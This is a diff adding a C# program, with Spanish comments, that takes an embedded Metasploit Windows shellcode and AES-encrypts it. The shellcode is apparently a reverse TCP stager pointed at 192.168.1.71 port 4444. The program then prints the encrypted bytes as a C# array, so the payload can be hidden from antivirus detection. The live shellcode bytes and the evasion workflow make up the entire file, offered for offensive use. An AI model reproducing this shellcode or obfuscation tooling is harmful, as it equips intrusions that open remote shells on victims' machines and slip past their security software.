@@ -1,0 +1,167 @@
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.IO;
+using System.Text;
+using System.Security.Cryptography;
+
+namespace ofuscar_AES_shellcode_metasploit
+{
+    static class Program
+    {
+        /// <summary>
+        /// The main entry point for the application.
+        /// </summary>
+        [STAThread]
+        static void Main()
+        {
+ //declara e inicializa un array de bytes llamado shellcode_metasploit con una longitud de 354 elementos.
+            byte[] shellcode_metasploit = new byte[354]
+            {
+               0xfc,0xe8,0x8f,0x00,0x00,0x00,
+            0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,
+            0x8b,0x52,0x14,0x0f,0xb7,0x4a,0x26,0x8b,0x72,0x28,0x31,0xff,
+            0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,
+            0x01,0xc7,0x49,0x75,0xef,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,
+            0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,
+            0x8b,0x58,0x20,0x50,0x8b,0x48,0x18,0x01,0xd3,0x85,0xc9,0x74,
+            0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xc1,
+            0xcf,0x0d,0xac,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,
+            0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,
+            0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,
+            0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,
+            0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
+            0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,
+            0x4c,0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,
+            0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,
+            0x6a,0x0a,0x68,0xc0,0xa8,0x01,0x47,0x68,0x02,0x00,0x11,0x5c,
+            0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,
+            0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,
+            0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,
+            0x75,0xec,0xe8,0x67,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,
+            0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,
+            0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,
+            0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,
+            0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,
+            0x00,0x7d,0x28,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,
+            0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,
+            0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,0x70,0xff,
+            0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,
+            0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5
+                    };
+
+            string banner = @"
+
+
+
+       _______       .___            ________        _______   
+  ____ \   _  \    __| _/____   ____ \_____  \______ \   _  \  
+_/ ___\/  /_\  \  / __ |/ __ \_/ ___\  _(__  <_  __ \/  /_\  \ 
+\  \___\  \_/   \/ /_/ \  ___/\  \___ /       \  | \/\  \_/   \
+ \___  >\_____  /\____ |\___  >\___  >______  /__|    \_____  /
+     \/       \/      \/    \/     \/       \/              \/ 
+
+
+";
+
+             //titulo que llevara la terminal
+            Console.Title = "Ofuscar shellcode metasploit";
+            //definir color verde para la letra de la terminal
+            Console.ForegroundColor = ConsoleColor.DarkGreen;
+           //escribir el banner en la terminal
+            Console.WriteLine(banner);
+            //resetear el color a blanco para que solo el banner sea verde en este caso
+            Console.ResetColor();
+
+            //como se ofuscara en AES, se requiere una clave para encriptar
+            var clave_aleatoria = generar_clave_aleatoria(20);
+            //escribir en terminal la clave aleatoria
+            Console.WriteLine("Clave aleatoria > " + clave_aleatoria);
+            //transformar la clave aleatoria a bytes y luego a SHA256
+            byte[] clave_aleatoria_bytes = Encoding.UTF8.GetBytes(clave_aleatoria);
+            clave_aleatoria_bytes = SHA256.Create().ComputeHash(clave_aleatoria_bytes);
+            //encriptar el shellcode en AES
+            byte[] shellcode_metasploit_aes = AES_Encrypt(shellcode_metasploit, clave_aleatoria_bytes);
+
+            //construiremos el codigo de shellcode para C#, pero esta vez con sus bytes encriptados en AES
+            StringBuilder codigo_c_shellcode_aes = new StringBuilder();
+            //con Append se va uniendo texto en una string
+            //primera parte de la variable, tipo bytes, que alamacenara la shellcode encriptada
+            codigo_c_shellcode_aes.Append("byte[] shellcode_metasploit_aes = new byte[");
+            //se le debe indicar la cantidad de bytes que componen la shellcode, sin embargo al encriptarla, su tamaño original cambiara
+            //determinaremos el tamaño de la nueva shellcode
+            codigo_c_shellcode_aes.Append(shellcode_metasploit_aes.Length);
+            //cerrar el tamaño de la shellcode
+            codigo_c_shellcode_aes.Append("] { ");
+            //recorreremos cada uno de los bytes encriptados y les daremos formato hexadecimal
+            for (int i = 0; i < shellcode_metasploit_aes.Length; i++)
+            {
+                //dar formato y poner cada uno de los valores, dentro de la string
+                codigo_c_shellcode_aes.Append("0x");
+                codigo_c_shellcode_aes.AppendFormat("{0:x2}", shellcode_metasploit_aes[i]);
+                //se deben separar cada uno de los valores hexadecimales con una coma, sin agregar la coma al final
+                if (i < shellcode_metasploit_aes.Length - 1)
+                {
+                    codigo_c_shellcode_aes.Append(", ");
+                }
+            }
+            //cerrar el parentesis que almacena la shellcode
+            codigo_c_shellcode_aes.Append(" };");
+            //escribir la string (variable en C# que contienen la shellcode)
+            Console.WriteLine(codigo_c_shellcode_aes.ToString());
+            //no cerrar la consola hasta que se aprete una tecla
+            Console.ReadKey();
+        }
+        //funcion que generara una clave aleatoria, con el largo que se le indique
+        public static string generar_clave_aleatoria(int length)
+        {
+            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
+            StringBuilder res = new StringBuilder();
+            Random rnd = new Random();
+            while (0 < length--)
+            {
+                res.Append(valid[rnd.Next(valid.Length)]);
+            }
+            return res.ToString();
+        }
+
+
+        //funcion para encriptar bytes en AES
+        //bytesToBeEncrypted : bytes a encriptar (shellcode)
+        //passwordBytes : bytes de la clave aleatoria
+        public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
+        {
+            byte[] encryptedBytes = null;
+
+            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+
+            using (MemoryStream ms = new MemoryStream())
+            {
+                using (RijndaelManaged AES = new RijndaelManaged())
+                {
+                    AES.KeySize = 256;
+                    AES.BlockSize = 128;
+
+                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                    AES.Key = key.GetBytes(AES.KeySize / 8);
+                    AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+                    AES.Mode = CipherMode.CBC;
+
+                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
+                    {
+                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
+                        cs.Close();
+                    }
+
+                    encryptedBytes = ms.ToArray();
+                }
+            }
+
+            return encryptedBytes;
+        }
+
+    }
+}
